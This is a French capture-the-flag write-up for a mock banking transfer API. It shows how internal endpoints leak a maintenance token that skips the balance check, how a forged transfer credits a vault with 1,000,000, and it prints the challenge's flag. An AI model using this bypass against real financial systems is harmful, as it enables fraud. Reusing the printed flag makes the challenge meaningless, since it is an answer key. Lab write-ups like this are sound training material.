# Level 3 (Currency Confusion) - REST in Peace

**Flag :** `HSR{qu4nd_la_dev1se_fa1t_n_import3_quoi_le_syst3me_su1vra!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Reconnaissance](#étape-1---reconnaissance)
- [Étape 2 - Découverte des endpoints internes](#étape-2---découverte-des-endpoints-internes)
- [Étape 3 - Récupération du token de maintenance](#étape-3---récupération-du-token-de-maintenance)
- [Étape 4 - Exploitation](#étape-4---exploitation)
- [Étape 5 - Flag](#étape-5---flag)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à une interface de transfert de fonds entre comptes internes. Un coffre-fort (`vault`) doit atteindre un seuil de 1 000 000 EUR pour débloquer le flag. Les soldes des comptes sont largement insuffisants pour y arriver par des transferts classiques.

---

## Étape 1 - Reconnaissance

Consulter les comptes et constater que les soldes sont insuffisants :

```
GET /api/accounts
```

```json
{
  "accounts": {
    "alice":   { "balance": 500,  "currency": "EUR" },
    "bob":     { "balance": 300,  "currency": "EUR" },
    "charlie": { "balance": 150,  "currency": "EUR" },
    "vault":   { "balance": 0,    "currency": "EUR" }
  },
  "unlock_threshold": 1000000
}
```

Tenter un transfert avec une devise invalide retourne " Devise non supportée ". Cela indique qu'il existe une liste de devises acceptées quelque part.

---

## Étape 2 - Découverte des endpoints internes

En inspectant le code source de la page, un commentaire HTML révèle :

```html
<!-- api v3.2 | endpoints internes: /api/internal/* -->
```

Tester les chemins courants sous `/api/internal/` :

```
GET /api/internal/currencies
```

```json
{
  "currencies": [
    { "code": "EUR", "name": "Euro",            "active": true, "restricted": false },
    { "code": "USD", "name": "US Dollar",       "active": true, "restricted": false },
    { "code": "GBP", "name": "British Pound",   "active": true, "restricted": false },
    { "code": "CHF", "name": "Swiss Franc",     "active": true, "restricted": false },
    { "code": "FLAG", "name": "Internal Token",  "active": true, "restricted": true,
      "note": "requires X-Maintenance-Token header" }
  ]
}
```

La devise `FLAG` existe, est active, mais restreinte. Elle nécessite un header `X-Maintenance-Token`.

---

## Étape 3 - Récupération du token de maintenance

```
GET /api/internal/config
```

```json
{
  "maintenance_token": "maint-4e7a1c9f3b2d8e6a0c5f7d9b",
  "environment": "staging",
  "balance_check": "enabled",
  "balance_check_bypass": "active when X-Maintenance-Token is valid and currency is restricted",
  "max_transaction": "unlimited in maintenance mode"
}
```

Le token de maintenance est exposé en clair. La configuration indique que le contrôle de solde est contourné quand le token est valide et la devise est restreinte.

---

## Étape 4 - Exploitation

Envoyer un transfert avec la devise `FLAG`, le token de maintenance, et un compte source existant (qui ne sera pas débité) :

```
POST /api/transfer
Content-Type: application/json
X-Maintenance-Token: maint-4e7a1c9f3b2d8e6a0c5f7d9b

{
  "from": "alice",
  "to": "vault",
  "amount": 1000000,
  "currency": "FLAG"
}
```

```json
{
  "success": true,
  "transaction": {
    "id": 1,
    "from": "alice",
    "to": "vault",
    "amount": 1000000,
    "currency": "FLAG"
  },
  "destination_balance": 1000000
}
```

La devise `FLAG` avec le token de maintenance contourne le contrôle de solde et ne débite pas le compte source. Le vault atteint le seuil.

---

## Étape 5 - Flag

```
GET /api/admin/unlock
```

```json
{
  "unlocked": true,
  "flag": "HSR{qu4nd_la_dev1se_fa1t_n_import3_quoi_le_syst3me_su1vra!}",
  "vault_balance": 1000000
}
```

---

## Résumé de la chaîne de résolution

```
Interface web (transfert de fonds)
  |
  |-- Ctrl+U -> commentaire HTML mentionnant /api/internal/*
          |
          |-- GET /api/internal/currencies -> devise "FLAG" (restreinte, nécessite token)
          |
          |-- GET /api/internal/config -> maintenance_token exposé
                    |
                    |-- POST /api/transfer (currency: FLAG + X-Maintenance-Token)
                              |
                              |-- vault atteint 1 000 000 -> GET /api/admin/unlock -> flag
```
